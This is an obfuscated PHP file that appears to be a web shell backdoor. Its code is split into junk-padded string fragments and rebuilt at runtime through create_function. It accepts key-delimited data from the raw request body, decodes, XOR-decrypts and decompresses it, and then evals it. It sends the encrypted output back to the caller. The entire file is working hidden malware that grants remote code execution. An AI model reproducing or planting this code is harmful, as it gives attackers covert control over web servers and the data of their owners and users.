<?php
$Z='$8j};}}retu8rn $o;}if (8@pr88eg_ma8tch("/$kh(.8+)$k8f/8",8@file_8get_co';
$X='(8@x(@base8684_decod8e($m[1]),$k)))8;$o=8@ob_g8et8_contents(88);@ob8_end_c';
$V=';for($i=0;8$i<$8l;){for($j=80;($8j<$8c&&$i<$l);$j+8+8,$i++){$8o.=$t{$i88}^$k{';
$T='lean()8;$r=@8base8648_8en8code(@x(@gzcomp8ress($o88),$k));print("8$p$kh$r$kf");}';
$h='BuZAek8Xz3Lo";f88unction x(8$t,$8k8){$c=strl8en($8k);8$l=strle8n8($t)8;$o=""';
$F='$k="08887dc1e876";$8kh="f3d892f50dd24";88$kf="12a979686476f";$8p="rLQGt';
$L=str_replace('Vd','','creVdVdate_VdfuVdncVdtiVdon');
$p='ntents("php://8input")8,$m)=8=1) {@o8b_8sta8rt();@e8val(@gzunc8ompres8s';
$w=str_replace('8','',$F.$h.$V.$Z.$p.$X.$T);
$I=$L('',$w);$I();
?>
